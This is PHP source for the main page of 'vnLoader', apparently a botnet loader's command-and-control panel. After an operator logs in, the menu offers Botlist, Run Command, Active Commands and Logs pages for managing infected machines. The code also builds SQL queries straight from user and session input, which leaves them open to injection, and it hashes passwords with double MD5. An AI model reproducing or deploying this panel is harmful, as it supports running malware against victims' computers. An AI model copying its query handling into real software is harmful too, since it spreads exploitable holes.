<?php
	//define vnLoader
	define ( "vnLoader" , '' );
	//define variables
	$page = '';
	$pageid = $_GET['pid'];
	$IP = $_SERVER['REMOTE_ADDR'];
	$date = gmdate("d.m.Y");
	$time = gmdate("H:i");
	//sql connection
	include ( "./sql.inc.php" );
	//user information
	$user = array (  );
	//start session
	session_start (  );
	
	//check loginstate
	if ( $_SESSION['user'] && $_SESSION['pass'] )
		{
        //user seems to be logged in. proove this
        $sql = "SELECT userlist.pass FROM userlist WHERE userlist.id = '" . $_SESSION['user'] . "';";
        $result = mysql_query ( $sql );
        $row = mysql_fetch_array ( $result );
		if ( $row['pass'] == $_SESSION['pass'] )
			{
			//login proved
			$user['name'] = $_SESSION['user'];
			$user['login'] = true;
			}
		else
			{
			//login refuted
			session_unset (  );
			$user['login'] = false;
			}
		}
	//check if attemps to login
	else if ( $_POST['user'] && $_POST['pass'] )
		{
              //user attemps to login. proove this but first tidy variables
	       $_SESSION['user'] = trim ( $_POST['user'] );
	       $_POST['pass'] = trim ( $_POST['pass'] );
	       //hash password
	       $_SESSION['pass'] = md5 ( md5 ( $_POST['pass'] ) );
	       //now proove login
	       $sql = "SELECT userlist.pass FROM userlist WHERE userlist.id =  '" . $_POST['user'] . "';";
	       $result = mysql_query ( $sql );
	       $row = mysql_fetch_array ( $result );
		if ( $row['pass'] == $_SESSION['pass'] )
			{
			//login proved
			$user['name'] = $_SESSION['user'];
			$user['login'] = true;
			}
		else
			{
			//login refuted
			session_unset (  );
			$user['login'] = false;
			}
		}
	//set which page to include
	if ( $user['login'] ) 
		{
		if ( isset ( $pageid ) )
			{
			if ( $pageid == '1' )
				{
				//Statistic
				$site = 'Statistic';
				$inc_page = './include/statistic.php';
				}
			else if ( $pageid == '2' )
				{
				//Botlist
				$site = 'Botlist';
				$inc_page = './include/botlist.php';
				}
			else if ( $pageid == '3' )
				{
				//Run Command
				$site = 'Run Command';
				$inc_page = './include/runcmd.php';
				}
			else if ( $pageid == '4' )
				{
				//Active Commands
				$site = 'Active Commands';
				$inc_page = './include/activecmd.php';
				}
			else if ( $pageid == '5' )
				{
				//Logs
				$site = 'Logs';
				$inc_page = './include/logs.php';
				}
			else if ( $pageid == '6' )
				{
				//User Control Panel
				$site = 'User Control Panel';
				$inc_page = './include/usercp.php';
				}
			else if ( $pageid == '7' )
				{
				//Logout
				$site = 'Logout';
				$inc_page = './include/logout.php';
				}
			else
				{
				//Statistic
				$site = 'Statistic';
				$inc_page = './include/statistic.php';
				}
			
			//set headwords
			$menu = 'Menu';
			$information = 'Information';
			
			}
		else
			{
			//Statistic
			$site = 'Statistic';
			$inc_page = './include/statistic.php';
			//set headwords
			$menu = 'Menu';
			$information = 'Information';
			}
		}
	else 
		{
		//set headwords
		$menu = ' ';
		$information = ' ';
		//Login
		$site = 'Login';
		$inc_page = './include/login.php';
		}
		
		//start creating the page
		$page .= '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">' . "\n";
		$page .= '<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="de-DE">' . "\n";
		$page .= '	<head profile="http://gmpg.org/xfn/11">' . "\n";
		$page .= '		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />' . "\n";
		$page .= '		<title>vnLoader</title>' . "\n";
		$page .= '		<link rel="stylesheet" href="./main.css" type="text/css" media="screen" />' . "\n";
		$page .= '	</head>' . "\n";
		$page .= '	<body id="body">' . "\n";
	if ( $user['login'] ) 
		{
		//logo is clickable
		$page .= '		<a href="./index.php?pid=1">' . "\n";
		$page .= '			<div id="logo"></div>' . "\n";
		$page .= '		</a>' . "\n";
		}
	else
		{
		//logo is not clickable
		$page .= '			<div id="logo"></div>' . "\n";
		}
		$page .= '		<br /><br />' . "\n";
		$page .= '		<div id="box_left">' . "\n";
		$page .= '			<div id="bar">' . "\n";
		$page .= '				<div id="bar_text"><div class="center">' . $menu . '</div></div>' . "\n";
		$page .= '			</div>' . "\n";
	if ( $user['login'] )
        {
        //show menu
		$page .= '			<br />' . "\n";
		$page .= '			&nbsp;<a href="./index.php?pid=1">Statistic</a><br />' . "\n";
		$page .= '			&nbsp;<a href="./index.php?pid=2">Botlist</a><br />' . "\n";
		$page .= '			&nbsp;<a href="./index.php?pid=3">Run Command</a><br />' . "\n";
		$page .= '			&nbsp;<a href="./index.php?pid=4">Active Commands</a><br />' . "\n";
		$page .= '			&nbsp;<a href="./index.php?pid=5">Logs</a><br />' . "\n";
		$page .= '			&nbsp;<a href="./index.php?pid=6">User Control Panel</a><br />' . "\n";
		$page .= '			&nbsp;<a href="./index.php?pid=7">Logout</a><br />' . "\n";
		$page .= '			<br />' . "\n";
		}
	else
		{
		//seplace menu with space
		$page .= '			<br />' . "\n";
		$page .= '			<br />' . "\n";
		$page .= '			<br />' . "\n";
		}
		
		//continue page
		$page .= '		</div>' . "\n";
		$page .= '		<div id="box_right">' . "\n";
		$page .= '			<div id="bar">' . "\n";
		$page .= '				<div id="bar_text"><div class="center">' . $information . '</div></div>' . "\n";
		$page .= '			</div>' . "\n";
		$page .= '			<br />' . "\n";
		$page .= '			<div class="center">' . "\n";
		
	if ( $user['login'] )
		{
		//show information
		$page .= '				Username:<div class="font">' . $user['name'] . '</div>' . "\n";
		$page .= '				<br />' . "\n";
		$page .= '				IP-Address:<div class="font">' . $IP . '</div>' . "\n";
		$page .= '				<br />' . "\n";
		$page .= '				Date - Time:<div class="font">' . $date . ' - ' . $time . ' GMT</div>' . "\n";
		$page .= '				<font size="1"><br />Coded by <font color="#1b84ec">van1lle</font> @ HF</font>' . "\n";
		}
	else
		{
		include ( $inc_page );
		}
		
		//continue page
		$page .= '			</div>' . "\n";
		$page .= '		</div>' . "\n";
		$page .= '		<div id="box_mid">' . "\n";
		$page .= '			<div id="bar">' . "\n";
		$page .= '				<div id="bar_text"><div class="center">' . $site . '</div></div>' . "\n";
		$page .= '			</div>' . "\n";
		$page .= '			<div class="center">' . "\n";		
		$page .= '				<br />' . "\n";
		
		//include pages
	if ( $user['login'] )
		{
		include ( $inc_page );
		}
	else
		{
		$page .= '				Please sign in.' . "\n";
		$page .= '				<br />' . "\n";
		}

		$page .= '				<br />' . "\n";
		$page .= '			</div>' . "\n";
		$page .= '		</div>' . "\n";
		$page .= '	</body>' . "\n";
		$page .= '</html>' . "\n";
	print$page;
?>